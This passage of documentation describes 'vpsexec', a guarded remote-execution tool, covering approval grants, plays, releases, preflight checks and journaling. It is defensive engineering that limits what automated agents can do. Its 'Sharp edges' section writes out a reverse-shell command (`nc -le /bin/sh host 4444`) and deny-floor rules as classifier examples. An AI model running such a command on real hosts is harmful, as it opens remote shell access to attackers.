`grant list` never sees it), sealed with the same `grant.key` (HMAC-SHA256 over
canonical JSON). The sealed body carries `kind: "incident"` and its own id, so a
grant renamed to `ic_...`, one incident copied over another's name, a widened
host list, a longer window or a file sealed with another key all refuse.

**Close, report, backfill.** `vpsexec incident close <id>` works early or after
expiry (a lapsed incident can still be closed to get its report). It journals
`incident_closed`, prints every command run under the incident from the
journal (time, hosts, placement, command, reason, plan-hash, per-host rc), and
writes the same report to `journal/incidents/<id>.md` (0600). The report ends in
a **backfill**: a draft `policies/*.yaml` with one `break_glass: true` entry per
distinct mutation, so the reviewed policy catches up after the outage. It is a
draft: set `expires` and `shape`, add a `verify`, delete the one-offs, and
review it like any runbook. Commands and reasons are secret-masked in the
report; a `<masked>` value must be rewritten before the entry can match.

Journal (`vpsexec.jsonl`): `incident_opened`, `incident_command` (incident id,
hosts, command, placement, targets, reason, plan-hash), `incident_closed`, plus
the usual `break_glass`, `mutation_attempt` and `mutation_complete`, each
carrying the incident id. Notification rides on the journal: every append is
handed to `telemetry.push_event`, so the control plane sees an incident open,
every command, and the close, with no extra network call.

What it protects against and what it does not is the `Threats:` docstring of
`vpscfg/vpsexecincident.py`. In short: it stops an agent, cron or CI from
opening or using one, and it stops a forged or stale file; it does **not** stop
a process running as you (it can read `grant.key` and allocate a pty), and it
does not stop a bad command typed during the outage — that is what the
backfill review is for.

## Containers

`--in` / `--in-match` / `--in-all` resolve against **live `docker ps` on each
host**, probed in parallel, and the resolved set is printed before you approve:

```
$ vpsexec edge1,web2 'df -h' --in-match 'shop-*'
WILL RUN:
  edge1 / shop-api             docker exec shop-api sh -lc 'df -h'
  edge1 / shop-frontend        docker exec shop-frontend sh -lc 'df -h'
  web2 / shop-api              docker exec shop-api sh -lc 'df -h'
```

- a name that is not live is refused, with the live list printed
- a name within **edit distance 1** of a live container is refused by name — the
  `shop_postgres-data` rule, applied to containers
- a glob matching nothing is refused; an empty set is a typo, not a no-op
- the command reaches `sh -lc` as one shell-quoted argument
- hand-rolled `docker exec` on the host is **tier 2**, because it sidesteps
  exactly these gates

A `where: container` runbook entry may name **the** container it authorises:

```yaml
  - hosts: [web1]
    cmd: "nginx -s reload"
    where: container
    container: shop-web
    why: "reload nginx in the shop container"
```

Such an entry matches only an invocation of exactly `--in shop-web`. It never
authorises a different container, `--in-match`, `--in-all`, or `--in shop-web
--in other`, and after the live targets are resolved the door checks again
that each such host resolved to exactly that container. The name follows the
CLI's rule for `--in` (alphanumeric first, then alphanumerics, `.` and `-`),
`container:` without `where: container` refuses at load, and an `--override`
file may not carry it. Entries without the key match any container, exactly
as before. `vpsexec runbooks` shows `where : container (container: NAME)`.

## Governor

vpsexec reads the same `vpscfg-control.json` for postures, the floor, the master
switch and the mode. Reads are allowed everywhere, as probes are today.
Mutations need posture `test` or `released` — stricter than deploy's rule; here
an unlisted or misspelled posture refuses too, because there is no contract to
fall back on.

`exec` is in `allowed_verbs`. Removing that one string disables vpsexec entirely,
everywhere, in one edit.

## Reading back a run: `vpsexec last`

A break-glass step needs a human at a real terminal. Its result does not need
to be pasted back: every mutation step journals its stdout and stderr (16 KiB
each), and `vpsexec last [HOST] [-n N]` prints the last N runs in full, with
command, reason, approval, each step's output, verify, and result. The human
says "done", and the agent reads the rest. An interrupted run shows as
`INCOMPLETE`. `log --export` still strips the output fields.

## Plays: `vpsrun`, one phrase for a reviewed sequence

When a fix is several mutations a human must approve (frozen hosts, or
anything the agent should not approve itself), the agent writes
`plays/<name>.yaml` (see `plays/README.md`). The human runs
`vpsrun plays/<name>.yaml` in a real terminal (`!` has no TTY and is refused),
reads every step's plan, and types the phrase it prints, `PLAY:<n>[:BREAK-GLASS:<m>]:<tag>`, where the tag binds the exact plans shown (break-glass count included when
any step elevates). Afterwards the agent reads the result with `vpsexec last`.

`vpsrun` holds no authority. Each step goes through this door twice: once
without `--run` for its plan-hash, then with `--run --approve=<that hash>`, so
every gate applies unchanged, and a plan that changed after it was shown
refuses and halts the play.

**Break-glass steps need an approval contract.** `--approve` alone no longer
approves break-glass, so a play with break-glass steps takes one:

```
vpsexec grant new <policy> --kind reusable --ttl 12h --run   # once, in your terminal
vpsrun plays/<name>.yaml                                     # no path pasted
#   or name one: vpsrun plays/<name>.yaml --approval-contract=~/.vpscfg/grants/<id>.json
```

**Auto-pick for a play.** With no contract flag (or `--approval-contract=auto`
/ `--grant auto`), vpsrun picks ONE grant for the whole play, before the
phrase and before anything runs: from the grants the door listed as valid
for EVERY break-glass step's plan (the door's own check, step by step), a
reusable one only if it has a use left for each break-glass step, ordered
short before reusable, then soonest-expiring, then lowest id. It prints
`grant  : auto-picked <kind> <id> code <code>` (and any tie), journals it in
`play_approved`, and passes that grant's path to each break-glass step as an
explicit `--approval-contract`, so the door checks it in full at every step.
If no single grant covers every break-glass step, the play refuses up front,
naming the steps; nothing runs. vpsrun takes only well-formed ids from under
the door's `grants  :` header and builds the path itself
(`~/.vpscfg/grants/<id>.json`) — plan text never supplies a path.

vpsrun reads each step's plan from the door; a step whose plan elevates a host
gets `--approval-contract=<absolute path>` alongside its `--approve=<hash>`, so
the door's combined path runs (hash match **and** the contract's full check,
controlling terminal included). Other steps get no contract. Checked **before**
the play is approved, so it never fails halfway for want of an approval:

- break-glass steps and no grant (named or auto-picked) covering all of them
  → refused, naming the steps and saying to mint one;
- a named reusable contract the door did not list as valid for a break-glass
  step, or with fewer uses left than the play has break-glass steps →
  refused;
- a contract that fails its own checks (MAC, expiry, revocation, file modes…)
  or does not cover every break-glass step's exact command, placement and
  hosts → refused, listing the uncovered steps;
- an empty `--approval-contract` refuses; `~` is expanded.

The play phrase `PLAY:<n>[:BREAK-GLASS:<m>]:<tag>` is still typed (pending input
is flushed first): the contract removes the per-step phrase, never the play's.
The runbook sha256 is re-checked by the door at every step, so a runbook edited
mid-play halts that step; a grant expiring mid-play does the same. Pick a TTL
that covers the play. The first failure halts; the rest are reported as
not run.

**Read steps.** A step whose command classifies as a read is never sent to
the door before the phrase (plan mode would run it there and then). It is
listed as `READ — runs here, after approval, as a plain read`, bound into the
phrase's tag like a plan, and run at its own position: `vpsexec <hosts> '<cmd>'`
with no `--run`, no `--approve` and no contract, so it cannot gain authority.
It may carry only `--in=`, `--in-match=` and `--timeout=`; any other flag
refuses the play at load. The door's output must report `tier    : read`; if
policy classifies it otherwise, the door runs nothing (there is no `--run`)
and the play halts at that step. A failing read halts like any step.

## Releases: `vpsrun release`, one command and one phrase

A release is plays in order, in `releases/<name>.yaml` under the estate root
(gitignored like `plays/`; see `plays/README.md` for the format). The normal
release is:

```
vpsexec grant new <policy…> --kind reusable --ttl 12h --run   # once; TTY; the mint phrase is yours
vpsrun release <name>                                         # every plan shown, ONE phrase
```

and after any halt, once the cause is fixed:

```
vpsrun release <name> --resume
```

`vpsrun release <name>` plans every step of every play through the door
(reads are not planned, as in a play), auto-picks ONE grant that the door
listed as valid for every break-glass step of the whole release, shows
everything, and asks for one phrase, `RELEASE:<name>:<n>[:BREAK-GLASS:<m>]:<tag>`,
whose tag binds exactly the plan-hashes that will run. Each step then runs with
its own `--approve=<hash>`. The first real failure halts the release.

If no grant covers the break-glass steps and the release names
`policies: [...]`, vpsrun starts the door's own
`vpsexec grant new <policies> --kind reusable --ttl <grant_ttl> --hosts <the
break-glass steps' hosts> --max-uses <their count> --for-release <name> --run`
on your terminal: the door shows what the grant authorises and asks for its
own mint phrase (anything else aborts, nothing runs). vpsrun mints nothing
itself. Without `policies:` it refuses and prints that command. The grant is
narrowed to what this release needs, only this release auto-picks it (a play,
another release and `vpsexec --grant auto` never spend its uses), and when the
release COMPLETES every grant bound to it that the door listed is revoked
(`grant_revoked`). A halted release keeps it for `--resume`. A retry after the
identical-plan guard or a re-run after a reconcile spends a use like any step:
if the grant runs out, the next run mints a new one.

**Holds and play boundaries.** `hold_before: "<what to check>"` on a play
entry stops before that play and asks for `GO:<play>`. Anything else stops the
release there (nothing of that play ran); `--resume` continues and asks again.
At every play boundary after a step ran (after the hold, if any), vpsrun
plans that play again: earlier plays changed the hosts since the phrase. If
any step now plans differently it shows the new plans and asks for
`REPLAN:<play>:<n>[:BREAK-GLASS:<m>]:<tag>` over the NEW plan-hashes
(journaled `play_replanned`); anything else stops before the play. A step
whose break-glass status changed stops the release (its grant was chosen for
the old plan).

**Run ids and resume.** Every run gets an id (`r_<16 hex>`), carried in each
step's `--reason` (`… — step 2: tag a [run r_…]`) and journaled per step in
the `vpsrun` journal stream (`run_started`, `step_started`, `step_done` with
the plan-hash and `ok`/`failed`/`skipped`, `run_halted`, `run_complete`).
`--resume` (for a release or a play: `vpsrun plays/x.yaml --resume`) continues
the latest unfinished run:

- a step whose exact plan-hash already succeeded at that position in this run
  is shown as `ALREADY DONE` and not run; the phrase counts only what runs;
- a failed or never-reached step runs again;
- a step that succeeded but now plans differently refuses the resume (vpsrun
  will neither re-run a done step nor skip a changed one);
- a step whose start was journaled but whose end was not (vpsrun was killed)
  is settled from the door's journal, searched by the plan-hash THAT START
  recorded and the run's own reason — never by the step's new plan: no
  attempt → it runs (under its new plan); an attempt and its
  `mutation_complete` → that outcome; an attempt with no outcome (Ctrl-C, a
  dropped terminal) → uncertain, below;
- a step that reached the door and now plans differently refuses the resume
  ("changed after it reached the door") — it is neither settled nor re-run
  under another plan;
- an UNCERTAIN step — a detached step that lost contact (an `uncertain` step
  record, or the host in `mutation_complete.lock_retained`), or an attempt
  with no outcome at all — refuses the resume and names
  `vpsexec reconcile <host>` for each host. A host is settled by a
  `reconciled` record after the attempt that names its operation id (from the
  step records), or, when none was journaled, whose lock owner carries this
  step's run reason; or by `reconcile_free` (the lock was already free). A
  reconcile of another operation settles nothing. In an attempt with no
  outcome, a host the door finished before it died is settled by the door's
  `host_done` record for it — written only after the host's every step, its
  verify and its lock release — with that rc and verify rc, and needs no
  reconcile. A per-step record is never enough: the door may have died between
  container steps or during the verify, with the lock still held;
- once settled, by host: a host is **done** when it was reconciled or finished
  `COMPLETED rc=0` with its verify passing (or none declared), or the door's
  own `mutation_complete` reported it successful;
  - done on **every** host: the step is **not** re-run by default — vpsrun
    asks at the terminal, naming per host what the answer rests on
    ("reconciled COMPLETED rc=0" only where a reconcile ran, else "finished by
    the door (host_done rc=0)"): `SKIP-DONE:<play>:<n>` journals it `ok`
    (`settled_from: reconcile`, `door` or `door+reconcile`),
    `RERUN:<play>:<n>` runs it again through the door, anything else aborts;
  - done on **some** hosts only: resume cannot run a play step on part of its
    hosts, so it asks only for `RERUN:<play>:<n>` — the prompt names the hosts
    that already completed ("including edge1"), and the step runs again on all
    of them; anything else aborts with "nothing ran" (finish the rest by hand
    through vpsexec and start a fresh run);
  - done **nowhere** (UNKNOWN, a non-zero rc, a failed verify, a free lock):
    it runs again through the door, never counted as done.

No hand-made "resume" plays: rerunning a play no longer repeats its
non-idempotent steps (`mkdir` without `-p`, image tags).

**Optional steps.** `id: w9` names a step; `when: "w9 reports NOT OWNED"` on a
later step of the same play runs it only if step w9's remote output (the host
block the door prints, never the plan, which echoes the command) matches the
regex. Otherwise the step is skipped, said so, and journaled as `skipped`.
Optional steps are planned, shown and covered by the phrase like any other.

**Timeouts.** A play step without `--timeout` inherits its runbook's
`timeout:` from the door itself (`--timeout` wins, then the longest runbook
timeout among the hosts, then the prediction); vpsrun adds nothing.
`tests/test_release_flow.py` proves it end to end through `dispatch`.

**On failure.** `on_fail: [{runbook: <policy file>, step: <n>}]` names
rollback runbook entries (`rollback: true`). When the release halts, vpsrun
prints the resume command and each rollback as the exact `vpsexec` command to
type. It never runs a rollback.

**Notifications.** With `integrations.notify.command` in the governor (an argv
list whose first word is an ABSOLUTE path), vpsrun runs it on `halt`,
`finish`, `lock_retained`, `refused` (a refusal while planning, approving or
resuming; the reason's first line only, masked) and `aborted` (Ctrl-C), with
the event name as the last argument and a JSON object (kind, name, run id,
where, rc, resume and rollback commands — never step output) on stdin. It runs
from `/` with a minimal environment (`PATH=/usr/bin:/bin`, `LC_ALL=C`, `HOME`):
none of your credentials or agent sockets. Off by default; nothing makes a
network call unless the command you configure does. A failing notifier never
fails the release.

**Progress and the repeat guard.** A step still running after 15 s prints
`... still running (Ns)` every 15 s, so a long recreate is visibly alive. When
the door's identical-plan guard refuses a step that is not this run's own
failed attempt, vpsrun says when the window ends (`wait until HH:MM`) and to
continue with `--resume`; the door's own unattended-repeat refusal says the same.

## Runbook lint and preflight: `vpsexec runbook`

A release used to find out at deploy time, one halt at a time, facts a
read-only check could have reported when the runbook was written. Two
commands move those checks to authoring time:

```
vpsexec runbook lint <policy.yaml> [--plays DIR] [--artifacts DIR]... [--json]
vpsexec runbook preflight <policy.yaml> [--live | --index-only] [--secrets-compare] [--json]
```

Both print one line per check (`pass`, `warn`, `fail`, `skip`, `error`, and
for preflight `MANUAL`) and end in one verdict, using the
[PREFLIGHT.md](PREFLIGHT.md) convention:

| Verdict | Exit | Meaning |
|---|---|---|
| `GO` | 0 | every check passed or did not apply |
| `GO-WITH-WARNINGS` | 1 | at least one `warn` or `MANUAL`, no `fail`/`error` |
| `NO-GO` | 2 | at least one `fail` or `error` |

`MANUAL` is never a pass. It names a fact the read tier cannot observe, and the
runbook step that verifies it.

Both commands only read. The outer door judges `runbook` as a read with no
host, and `--run` refuses. The policy file can be anywhere, such as a draft
outside `policies/`. It is validated with the loader's own rules, so a file
that the door would refuse fails lint as `policy`.

### `lint`: static, local, no host

Lint reads the policy file, the plays in `<estate>/plays` (or `--plays`), the
releases in `<estate>/releases` (or `--releases`), and the push artifacts in
`<estate>/artifacts` (or each `--artifacts`). Here `<estate>` is the directory
above the policy file's own directory.

| Check | fail (NO-GO) | warn |
|---|---|---|
| `shape` | `shape` is missing, or its steps, hosts or break-glass do not match the runbooks. The file would be disarmed. The evidence prints the correct `shape:` | — |
| `expires` | already lapsed | the runbooks disarm within 48 hours |
| `timeouts` | — | steps with no `timeout:` (listed). A play cannot carry a timeout the runbook never stated |
| `push step N` | no regular file with that basename under the artifact dirs (symlinks are not followed), or none hashes to the runbook's sha256; no artifact dir at all | — |
| `stop step N` | `why` says STOP (or "Stop if/unless/when…") but the command always exits 0, for example `docker ps --filter …`, `echo`, `… \| head`, or `… \|\| true` | — |
| `play <file>` | a play step names a 64-hex hash that is not in the policy (a stale push); a play's `--timeout=` is shorter than the runbook step's (an explicit timeout wins and cuts the step off); an `id:` / `when:` vpsrun would refuse (malformed or duplicate id, a `when` that is not `<earlier id> reports <regex>`, names no EARLIER step's id, or whose regex does not compile) | a play step that matches a runbook step with a `timeout:` carries no `--timeout=`; a play step runs an optional / "only if" runbook step with no `when:` |
| `release <file>` | a release that runs this policy's plays, lists it in `policies:` or names it in `on_fail` names a play that is not a file under the plays dir, or an `on_fail` entry for this policy that does not exist or is not a rollback step | it runs this policy's plays, the policy has break-glass steps, and `policies:` does not list it (the one reusable grant the release mints would not cover them) |
| `optional steps` | — | a step whose `why` says "optional" or "only if" (not a rollback step) appears in no play for this policy |
| `assumes` | — | no `assumes:` block, or a MANUAL fact with no `verified_by:` |
| `expands` | an action step's expansion no longer matches the declared `expands:` (or `expands:` is declared with no action step) — the file is DISARMED. The evidence prints the correct line to paste, from `actions.lint_expands` (docs/ACTIONS.md) | — |
| `probe step N` | a step whose `why` says probe, precheck, check or STOP classifies as something other than a read under `vpsexec.classify()` (or is refused outright) — a probe that can write is not a probe. The weekend halt this catches: a "precheck" that was actually a write used as a check | — |

A play counts as "for this policy" when at least one of its steps is a runbook
step: the same command after normalisation, or a push with the same sha256.
Other plays are ignored.

The STOP rule is conservative. It flags only commands known to always exit 0.
An unknown command counts as able to fail, so a STOP step lint does not flag
is not proven sound.

### `preflight`: read tier (or the cached index) against the hosts

Preflight compares the policy's `assumes:` block with the hosts — a cached
`vpscfg index` document when it is fresh enough, else fixed live reads built
from validated values:

| Fact | Read sent (when live) |
|---|---|
| container, `image` | `docker inspect --format '{{.Image}} {{.State.Status}}' NAME` |
| `env_names_any_of` | `docker inspect --format '{{range .Config.Env}}{{index (split . "=") 0}} {{end}}' NAME` |
| `compose_labels`, `compose_files` | `docker inspect --format '{{json .Config.Labels}}' NAME` |
| `absent` | `ls -d -- PATH…` |
| `min_free_gb` | `df -P -k -- PATH…` |
| `privileges` | one `has_table_privilege(role, table, priv)` SELECT per declared privilege, ANDed, through the host index's narrow sqlread gate (below) — never a live read through the plain allowlist |
| `owner_of_tables` | answered from a fresh index only (below); no live read exists for it |

Each live command is classified by the door's own `classify()` and must come
back `read`, or the check becomes `MANUAL` and nothing is sent. It is
deny-scanned, journaled as a `read` event (`"via": "runbook preflight"`), and
its output passes through `secretmask.mask()` before it is parsed.
**Environment variables are read as names only.** The template splits each
`NAME=value` on the host and prints the name, so no value crosses the wire.
The parser also drops anything after `=`, in case a host ever sends a value
back. Labels are shown only for the keys the policy declares, and masked
first. Preflight does not widen what counts as a read: it uses the read
grammar that already exists.

A probe that cannot answer (transport failure, an unparseable `df`, an `ls`
error other than "No such file") is `error`, never a pass.

### Index-backed preflight

`vpscfg index` (docs/INDEX.md) already caches containers, env NAMES and
Postgres ownership per host, refreshed on roughly a 12-hour cycle. Preflight
asks `indexstore.cache_status()` for the cached document for a host **once
per run**, and uses it instead of dialing when it is trustworthy:

- a regular file, never a symlink;
- owned by the user running `vpsexec`, mode exactly `0600` — checked on the
  path and again on the opened file (`fstat`), so a file swapped in between
  is judged on what is actually read;
- an `index_version` this tool knows (today: 1; a newer or unknown version
  is not trusted to mean the same thing);
- a `collected_at` that parses, is not more than 60 seconds in the future
  (clock skew), and is no older than the governor's
  `limits.index_max_age_hours` (default **12**, ceiling **24** — a higher
  value is clamped, never refused);
- and, for the specific fact being checked, the index section it needs has
  no `error` and is not `unavailable`.

What a fresh index answers, citing its age as `(index, 3h old)`:

- **container facts** — the container's state (`running`), its image id
  (`image:`), its env NAMES (`env_names_any_of:`, the `DATABASE_URL` vs
  `DB_*` question), and the compose labels the index records (project,
  service, working dir, config files) and `compose_files:`. All of an item's
  container facts come from the index, or all from a live read: a label the
  index does not record sends the whole item live. A container absent from a
  fresh index's container list is `fail`.
- **`owner_of_tables`** (below).

Anything else falls back to a live read (or, for a fact with no live
equivalent — `owner_of_tables` — to `MANUAL`), and the evidence names why:
`index stale 31h`, `index missing`, `the index's postgres section has an
error`. A live fallback for container facts is journaled as
`preflight_live_fallback` with that reason, and its result line reads
`(live; index: <reason>)`. An aliased host (the governor's `alias_of`) is resolved to its
canonical name **before** the cache is looked up, so the cache file to read
is the one `vpscfg index <canonical>` actually wrote.

Every result line names its source:

```
[pass  ] assumes[1] owner_of_tables   role shop_app owns every table … (index, 3h old)
[pass  ] assumes[2] shop-api          shop-api on web1 is running, image sha256:3f1c… (live)
```

Two flags on `preflight` (not `lint`, which never dials anyway):

- **`--live`** ignores the index entirely and always dials (or, for
  `owner_of_tables`, always falls back to `MANUAL` — there being no live
  read for it).
- **`--index-only`** never dials a host. Anything the index cannot answer is
  `skip`, never `pass` and never `MANUAL` — this is what `vpsrun release
  new` and `vpsrun release <name>` (lint on save, plays/README.md) run at
  authoring time, before any host is dialled.

`owner_of_tables` is the MANUAL fact the index turns into a real pass/fail: a
fresh index names every table in the assumed database (and schema, if given)
not owned by the assumed role. It is never a pass on an incomplete list: a
table list the index marked truncated, or one with no tables recorded at
all, proves nothing, so the line stays MANUAL (SKIP under `--index-only`)
unless the recorded tables already name an unowned one (then `fail`). `env_distinct` stays MANUAL — the index
never records a secret VALUE, by design, so there is nothing for it to
answer with, live or cached — unless you opt in:

- **`--secrets-compare`** (decision D4) answers each `env_distinct` set with
  the policy's own `ensure_secret` token-only check on that host
  (docs/ACTIONS.md, "Check"): the same pinned script, the same gate and the
  same fail-closed parsing as the door. Every pair in the set must be
  compared by some `ensure_secret` step (its `key` against one of its
  `distinct_from`); otherwise the line stays MANUAL and says which pair has
  no step. DONE is `pass`, NEEDED is `fail` (the key is missing, short or
  shares its value), anything else is `error` with the output withheld. No
  value is ever read back or printed; the journal gets a `read` record and a
  `secrets_compare` record with the token. Under `--index-only` it is `skip`
  and nothing is dialled. Without the flag nothing is read.

`assumes.privileges: {container, db, role, table, privs: [SELECT|INSERT|
UPDATE|DELETE, ...], schema?}` is new in this phase. The table is checked
schema-qualified (`schema`, default `public`, quoted server-side with
`format('%I.%I', …)`), never resolved through the session's `search_path`. It replaces the weekend's
write-used-as-a-probe pattern: instead of a hand-written `docker exec … psql
-c "UPDATE …"` masquerading as a check, preflight runs one
`has_table_privilege()` catalog SELECT per declared privilege (ANDed — the
role must hold all of them), through the same read-only, `BEGIN READ ONLY`,
10-second-`statement_timeout` session `vpscfg index` uses for Postgres, with
the password read inside the container, never on argv. It has no index
equivalent (the index does not enumerate per-role grants), so it is always
live unless `--index-only` skips it.

Every host's index lookup (used or not) is journalled as `preflight_source`
(`host`, `index_usable`, `age_seconds`, `reason`), so a release's evidence
shows exactly what preflight trusted and why.

**Not done here:** the outer door's `allowed_verbs` still has no `index`
entry — `vpscfg index` itself still needs the governor's acceptance to run as
a release step. That is a governor change in the estate, for the operator to make by
hand; this phase only wires index-backed *preflight*, which reads the cache
file directly and never invokes `vpscfg index`.

Implementation: `vpscfg/indexstore.py` (`cache_status`, `max_age_seconds`);
`vpscfg/runbookcheck.py` (`_index_doc`, `_owner_of_tables_check`,
`_privileges_check`). Tests: `tests/test_preflight_index.py`, hermetic (a
temp estate's own `index/` directory; a scripted ssh fake; `os.getuid` is the
only thing ever mocked, for the "cache owned by someone else" case).

### The `assumes:` block

`assumes:` is an optional top-level key in a policy file. It grants nothing and
is never a command. It is a list of items, and each item names one governed
`host` plus the facts the runbook takes for granted there:

| Key | Meaning | Checked by |
|---|---|---|
| `host` | required; a governed host (aliases resolve) | — |
| `container` | this container exists and is `running` | read |
| `image` | its image ID is exactly this `sha256:<64 hex>` (needs `container`) | read |
| `env_names_any_of` | at least one of these lists of variable NAMES is fully present (needs `container`) | read |
| `compose_labels` | `{label: value}` the container carries (needs `container`) | read |
| `compose_files` | paths that must appear in `com.docker.compose.project.config_files` (needs `container`) | read |
| `absent` | absolute paths the runbook creates, which must not exist yet | read |
| `min_free_gb` | `{path: GB}` free on the filesystem holding each path | read |
| `owner_of_tables` | `{container, role[, database, schema]}`: the role owns every table, sequence and view | pass/fail, **naming the tables**, from a fresh index (no `database:` given, a stale/missing/erroring index, or `--live`: **MANUAL** — ownership otherwise needs a database credential) |
| `env_distinct` | lists of variable names whose values must differ | **MANUAL**: comparing values means reading them, which the index never does. With `--secrets-compare`: pass/fail from the policy's `ensure_secret` token-only check (a token, never a value) |
| `privileges` | `{container, db, role, table, privs: [SELECT\|INSERT\|UPDATE\|DELETE, ...]}`: the role holds every listed privilege on the table | live `has_table_privilege()`, through the index's sqlread gate (above) |
| `verified_by` | the runbook step number that verifies this item's MANUAL facts | printed with the MANUAL line |

`owner_of_tables`'s index-backed answer currently names tables (and
partitioned tables) only — the index's per-object names cover that relkind;
sequences, views and materialized views are counted in the index but not
named. A fail from the index therefore undercounts rather than overcounts: a
not-owned table is always reported, a not-owned sequence or view is not.

Validation is as strict as the rest of the file. An unknown key, a fact without
the `container` it needs, an image that is not a full ID, a value where a name
belongs, a relative path or one with `..`, a glob, a space or a shell
character, or a `verified_by` outside the runbook's step range all refuse the
whole file, in the door's loader as well as in lint. `assumes:` is not part of
`shape`. Like `cmd`, it is per-file content that review and the file's sha256
already cover.

### Worked example: the October 2026 release halts

These are the halts from one weekend of releases in October 2026. The example shows them on a
fictional `shop` estate.

- A re-key step failed with `42501` because 5 tables, and then a sixth, were
  not owned by the app role.
- A precheck required `DATABASE_URL`, but the production container is
  configured with `DB_HOST/DB_NAME/DB_USER/DB_PASS`.
- A login wave found `SESSION_SECRET` equal to `JWT_SECRET` in the running
  container, and 8 objects not owned by the service role.
- Generated plays dropped steps marked optional, and did not carry the
  runbook's `timeout`s.

```yaml
version: 1
expires: "2026-12-31"
shape: {steps: 4, hosts: [web1], break_glass: true}
reason: shop 1.5.0 — re-key and recreate
assumes:
  - host: web1
    container: shop-api
    image: sha256:3f1c…(the full 64-hex ID the runbook was written against)
    env_names_any_of: [[DATABASE_URL], [DB_HOST, DB_NAME, DB_USER, DB_PASS]]
    compose_files: [/srv/shop/docker-compose.yml]
  - host: web1
    absent: [/srv/releases/shop-1.5.0]
    min_free_gb: {/srv: 5}
  - host: web1
    owner_of_tables: {container: shop-db, role: shop_app, database: shop}
    env_distinct: [[SESSION_SECRET, JWT_SECRET]]
    verified_by: 1
runbooks:
  - hosts: [web1]                                             # 1
    cmd: "…a read that lists objects not owned by shop_app and fails when any are…"
    where: host
    timeout: 60
    break_glass: true
    why: "P1: STOP if any table, sequence or view is not owned by shop_app"
  # 2-4: push, re-key, recreate, each with a timeout:
```

Run while the runbook is written:

```
$ vpsexec runbook lint policies/shop-1.5.0.yaml
  [pass  ] shape                              4 steps, hosts web1
  [warn  ] optional steps                     step(s) 3 say optional / only if, and no play includes them …
VERDICT: GO-WITH-WARNINGS (exit 1)

$ vpsexec runbook preflight policies/shop-1.5.0.yaml
  [pass  ] assumes[1] shop-api                shop-api on web1 is running, image sha256:3f1c… (live)
  [pass  ] assumes[1] shop-api env names      has DB_HOST, DB_NAME, DB_USER, DB_PASS (live)
  [pass  ] assumes[2] absent                  absent on web1: /srv/releases/shop-1.5.0 (live)
  [fail  ] assumes[3] owner_of_tables         role shop_app does not own: shop.t0, shop.t1, shop.t2, shop.t3, shop.t4, shop.t5, shop.t6, shop.t7 (index, 3h old)
  [MANUAL] assumes[3] env_distinct            SESSION_SECRET, JWT_SECRET must hold different values … Verify with runbook step 1 …
VERDICT: NO-GO (exit 2)
```

With a fresh `vpscfg index web1` on file, the weekend's silent re-key halt
(8 tables still owned by `postgres`) is a named `fail`, not a MANUAL line
nobody is forced to read, on the day the runbook was written. Without a
fresh index (a new estate, or one older than
`limits.index_max_age_hours`), the same line reads `[MANUAL] … (index
missing)` or `(index stale 31h)` — exactly the old behaviour, with the reason
now visible.

If the precheck had assumed only `[[DATABASE_URL]]`, preflight would print
`[DATABASE_URL] lacks DATABASE_URL. Present: DB_HOST, DB_NAME, DB_PASS, …`
(names only) and say NO-GO, on the day the runbook was written instead of at
its stage A.

Implementation: `vpscfg/runbookcheck.py`; the `assumes:` validator (including
`privileges`) is `vpsexecpolicy.check_assumes`. Tests:
`tests/test_runbookcheck.py` for the read-tier facts, and
`tests/test_preflight_index.py` for the index-backed path, `--live` /
`--index-only`, `privileges`, and the `probe step N` lint rule, plus the
lint-vs-plays/releases cases in `tests/test_release_valves_integration.py`.
They are hermetic: a temp estate (with its own `index/` directory) and a
fake host, and no test dials anything or reads a real cache.

## Journal

Everything lands in `journal/vpsexec.jsonl`: the wrapper's judgment, the plan
hash, the runbook or override digest, the approval mode, break-glass elevations
with their runbook, every step's rc per host, the per-host result map, and every
refusal. Mutations are journal-or-refuse.

## Sharp edges (real, and deliberate)

- **`truncate` anywhere in a command hits the floor.** The pattern is the SQL
  `TRUNCATE`, matched case-insensitively as a substring, so
  `grep -r truncate /var/log` is refused too. Weakening the floor is not on the
  table.
- **A recursive read is a read only under `/var/log`.** `grep -r ERROR /etc` is
  refused outright and `grep -r foo /opt/app/src` needs an approval: see
  "Recursive reads" under Credential paths.
- **All absolute-path `rm -rf` is floor, not risky.** `rm -rf /opt/scratch` is
  refused and nothing can lift it (the deny floor allows no `rm -rf` outside a
  contract's `deploy_dir`, and vpsexec has no contract). Relative paths
  (`rm -rf ./build`) are tier 2.
- **Two ssh stanzas for one machine can carry different keys** (say `relay2`
  with `id_rsa` and `relay2.example.net` with a dedicated key in
  `~/.ssh/config`). They collapse by `HostName`, so whichever you name first
  wins — and with it, that stanza's key. The fix: declare one name
  `alias_of` the other in the governor (the canonical name being the one that
  owns the working key), and give both ssh stanzas the one key that
  authenticates, so name order no longer picks the key.
- **Reads are allowed on frozen hosts.** Intentional, matching probe. If that is
  ever wrong, the fix is posture, not a new flag.
- **Bundled short flags count individually.** `curl -sfo` is treated as carrying
  `-o`, because otherwise `nc -le /bin/sh host 4444` — a reverse shell — would
  classify as a read and run unapproved on a frozen host.

## What it does not protect against

A semantically disastrous command that is syntactically ordinary.
`systemctl stop postgres`, with a committed runbook and a human typing
`BREAK-GLASS:3`, is indistinguishable from intent. That is what postures, blast
radius and review are for. vpsexec makes the dangerous thing *slow, visible,
bounded and recorded* — it does not make it impossible.
